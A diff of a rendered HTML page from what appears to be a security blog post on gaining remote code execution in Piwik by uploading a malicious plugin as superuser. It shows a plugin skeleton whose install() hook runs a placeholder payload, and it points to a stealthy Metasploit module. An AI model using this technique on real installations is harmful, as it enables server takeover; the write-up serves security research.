@@ -136,22 +136,22 @@ pwned/pwned.php
 pwned/plugin.json
 </code></pre><p>And the file content:</p>
 <p><strong>pwned.php</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-<span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Piwik\Plugins\pwned</span>;
-<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">pwned</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">\Piwik\Plugin</span> {
-  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">install</span>()
-  {
-    <span style="color:#a6e22e">PHP_PAYLOAD</span>
-  }
-}
-</code></pre></div><p><strong>plugin.json</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-  <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;pwned&#34;</span>,
-  <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;DESCRIPTION&#34;</span>,
-  <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;1.0&#34;</span>,
-  <span style="color:#f92672">&#34;theme&#34;</span>: <span style="color:#66d9ef">false</span>
-}
-</code></pre></div><p>You can zip those files together and upload it from the Marketplace site in the dashboard as superuser. After you activate the plugin the payload will be executed effectively turning the superuser credentials into remote code execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Piwik\Plugins\pwned</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">pwned</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">\Piwik\Plugin</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">install</span>()
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">PHP_PAYLOAD</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>plugin.json</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;pwned&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;DESCRIPTION&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;1.0&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;theme&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>You can zip those files together and upload it from the Marketplace site in the dashboard as superuser. After you activate the plugin the payload will be executed effectively turning the superuser credentials into remote code execution.</p>
 <p>As I like to automate the boring stuff I also wrote a Metasploit module to easily pwn Piwik installations. Because the payload fires on install and the files are automatically removed once the session is opened the plugin will not show up in the Marketplace and thus be really stealthy.</p>
 <p>You can find the Metasploit module here: <a href="https://github.com/rapid7/metasploit-framework/pull/7917">https://github.com/rapid7/metasploit-framework/pull/7917</a></p>
                     </div>
